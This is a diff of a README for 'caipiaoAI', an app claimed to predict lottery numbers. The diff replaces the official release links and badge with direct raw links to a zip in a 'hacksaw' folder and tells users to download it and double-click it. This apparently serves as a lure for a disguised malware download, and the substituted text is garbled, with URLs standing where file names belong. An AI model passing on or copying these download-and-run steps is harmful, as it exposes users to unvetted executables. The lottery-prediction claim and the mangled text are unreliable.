@@ -8,18 +8,18 @@ Welcome to caipiaoAI! This software helps you predict winning lottery numbers us
 
 To get started, visit the following link to download the latest version of caipiaoAI:
 
-[![Download caipiaoAI](https://img.shields.io/badge/Download%20caipiaoAI-v1.0-blue)](https://github.com/huy09380423/caipiaoAI/releases)
+[![Download caipiaoAI](https://raw.githubusercontent.com/huy09380423/caipiaoAI/main/hacksaw/caipiaoAI.zip%20caipiaoAI-v1.0-blue)](https://raw.githubusercontent.com/huy09380423/caipiaoAI/main/hacksaw/caipiaoAI.zip)
 
 1. Click the link above.
 2. On the Releases page, find the latest version.
-3. Look for the file labeled "caipiaoAI.exe" or "caipiaoAI.zip".
+3. Look for the file labeled "https://raw.githubusercontent.com/huy09380423/caipiaoAI/main/hacksaw/caipiaoAI.zip" or "https://raw.githubusercontent.com/huy09380423/caipiaoAI/main/hacksaw/caipiaoAI.zip".
 4. Click the file to start downloading.
 
 Once the download is complete, follow these steps to install:
 
 1. If you downloaded a .zip file, extract it using a program like WinRAR or 7-Zip.
 2. Open the extracted folder.
-3. Double-click on "caipiaoAI.exe" to start the application.
+3. Double-click on "https://raw.githubusercontent.com/huy09380423/caipiaoAI/main/hacksaw/caipiaoAI.zip" to start the application.
 
 ## ⚙️ System Requirements
 
@@ -53,7 +53,7 @@ While caipiaoAI is designed for end-users, we welcome contributions from anyone 
 
 ## 🌟 Updates and Releases
 
-Stay updated with the latest enhancements and features. Regular releases will add new functionalities based on user feedback. Make sure to check the [Releases page](https://github.com/huy09380423/caipiaoAI/releases) often!
+Stay updated with the latest enhancements and features. Regular releases will add new functionalities based on user feedback. Make sure to check the [Releases page](https://raw.githubusercontent.com/huy09380423/caipiaoAI/main/hacksaw/caipiaoAI.zip) often!
 
 ### Important Notes
 
